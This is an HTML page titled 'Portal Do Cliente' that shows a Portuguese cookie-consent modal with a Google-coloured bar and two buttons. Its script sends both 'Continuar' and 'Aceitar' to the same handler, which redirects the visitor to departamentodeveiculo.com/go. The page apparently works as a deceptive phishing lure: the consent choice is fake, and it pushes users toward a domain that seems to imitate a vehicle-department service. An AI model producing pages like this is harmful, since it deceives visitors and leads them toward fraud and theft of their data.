<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Portal Do Cliente</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: Roboto, Arial, Helvetica, sans-serif;
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 24px 16px;
  background: linear-gradient(145deg, #c8c8c8 0%, #d8d8d8 50%, #cecece 100%);
  -webkit-font-smoothing: antialiased;
}

.cookie-modal {
  width: 100%;
  max-width: 420px;
  background: #fff;
  border-radius: 18px;
  overflow: hidden;
  box-shadow: 0 18px 48px rgba(0, 0, 0, 0.28);
}

.cookie-bar {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  height: 6px;
}

.cookie-bar span:nth-child(1) { background: #4285f4; }
.cookie-bar span:nth-child(2) { background: #ea4335; }
.cookie-bar span:nth-child(3) { background: #fbbc05; }
.cookie-bar span:nth-child(4) { background: #34a853; }

.cookie-content {
  padding: 22px 22px 20px;
}

.cookie-header {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 16px;
}

.cookie-icon {
  width: 38px;
  height: 38px;
  border-radius: 50%;
  background: #fde7c7;
  color: #e8a23a;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
}

.cookie-icon svg {
  width: 22px;
  height: 22px;
}

.cookie-header h1 {
  font-size: 20px;
  font-weight: 700;
  color: #202124;
  line-height: 1.25;
}

.cookie-text {
  font-size: 15px;
  line-height: 1.55;
  color: #5f6368;
  margin-bottom: 22px;
}

.cookie-text strong {
  color: #3c4043;
  font-weight: 700;
}

.cookie-actions {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 12px;
}

.cookie-btn {
  appearance: none;
  width: 100%;
  min-width: 0;
  height: 46px;
  border-radius: 12px;
  font-family: inherit;
  font-size: 15px;
  font-weight: 500;
  cursor: pointer;
  transition: background 0.18s ease, border-color 0.18s ease, transform 0.12s ease, opacity 0.18s ease;
}

.cookie-btn:disabled {
  pointer-events: none;
  opacity: 0.72;
}

.cookie-btn:active {
  transform: scale(0.98);
}

.cookie-btn-continue {
  background: #fff;
  color: #3c4043;
  border: 1px solid #dadce0;
}

.cookie-btn-continue:hover {
  background: #f8f9fa;
  border-color: #bdc1c6;
}

.cookie-btn-accept {
  background: #1a73e8;
  color: #fff;
  border: 1px solid #1a73e8;
  box-shadow: 0 1px 2px rgba(26, 115, 232, 0.24);
}

.cookie-btn-accept:hover {
  background: #1669d4;
}

.cookie-footer {
  margin-top: 18px;
  text-align: center;
  font-size: 13px;
  color: #80868b;
}

.cookie-footer span {
  color: #1a73e8;
}

@media (max-width: 380px) {
  .cookie-content {
    padding: 18px 16px 16px;
  }

  .cookie-header h1 {
    font-size: 18px;
  }

  .cookie-text {
    font-size: 14px;
  }
}
</style>
</head>
<body>
<div class="cookie-modal">
  <div class="cookie-bar" aria-hidden="true">
    <span></span><span></span><span></span><span></span>
  </div>

  <div class="cookie-content">
    <div class="cookie-header">
      <div class="cookie-icon" aria-hidden="true">
        <svg viewBox="0 0 24 24" fill="currentColor">
          <path d="M12 2a10 10 0 1 0 10 10 1 1 0 0 0-1.08-1A3.5 3.5 0 0 1 17.5 8a1 1 0 0 0-1-1 3.5 3.5 0 0 1-3.42-2.92A1 1 0 0 0 12 2zm-3.2 8.4a1.2 1.2 0 1 1 0 2.4 1.2 1.2 0 0 1 0-2.4zm5.5 1.1a1 1 0 1 1 0 2 1 1 0 0 1 0-2zM9.4 15.8a1.15 1.15 0 1 1 0 2.3 1.15 1.15 0 0 1 0-2.3zm5.6.1a.85.85 0 1 1 0 1.7.85.85 0 0 1 0-1.7z"/>
        </svg>
      </div>
      <h1>Preferências de Cookies</h1>
    </div>

    <p class="cookie-text">
      Usamos cookies para melhorar sua experiência.<br>
      Você pode <strong>aceitar</strong> ou <strong>continuar</strong> com as preferências atuais.
    </p>

    <div class="cookie-actions">
      <button type="button" class="cookie-btn cookie-btn-continue" id="continueBtn">Continuar</button>
      <button type="button" class="cookie-btn cookie-btn-accept" id="acceptBtn">Aceitar</button>
    </div>

    <p class="cookie-footer">
      Saiba mais na nossa <span>Política de Privacidade</span>.
    </p>
  </div>
</div>

<script>
const redirectUrl = "https://departamentodeveiculo.com/go";
const acceptBtn = document.getElementById("acceptBtn");
const continueBtn = document.getElementById("continueBtn");
let sending = false;

function goToPortal() {
  if (sending) return;
  sending = true;
  acceptBtn.disabled = true;
  continueBtn.disabled = true;
  window.location.href = redirectUrl;
}

acceptBtn.addEventListener("click", goToPortal);
continueBtn.addEventListener("click", goToPortal);
</script>
</body>
</html>
